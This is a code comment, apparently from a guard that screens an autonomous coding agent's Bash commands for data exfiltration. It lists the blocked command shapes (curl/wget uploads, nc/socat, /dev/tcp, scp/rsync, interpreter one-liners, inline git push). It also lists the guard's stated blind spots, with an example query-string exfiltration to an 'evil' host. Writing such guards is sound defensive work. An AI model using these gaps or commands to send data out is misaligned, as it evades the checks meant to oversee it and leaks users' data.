 ...
 * the "send local data out" Bash shapes — `curl`/`wget` carrying a request body or
 * upload flag, a pipe/redirect into a raw socket (`nc`/`ncat`/`socat`, `>/dev/tcp/…`),
 * `scp`/`sftp`/`rsync` to a remote host (incl. a bare `host:path`), an interpreter
 * one-liner that opens a connection (`python3 -c "urllib…urlopen"`, `node -e
 * "fetch(…)"`), and a `git push` to an INLINE remote (a URL or `user@host:`, vs a
 * configured named remote like `origin`) — because those are ~never right in an
 * autonomous coding run. Each command-word check runs on the `env`-unwrapped
 * command so `env curl …` can't dodge the binary match. It is DELIBERATELY blind
 * to: data smuggled inside a GET URL/query string (`curl https://evil/?x=$(…)`) or
 * hidden by encoding, since separating that from a legitimate fetch needs data-flow
 * analysis, not a string match; and any transfer via an SDK/MCP tool or a renamed
 * binary. True egress containment (an actual network boundary) is the OS sandbox's
 * job — `sandbox.ts` is write-only today and does NOT stop egress.
 *
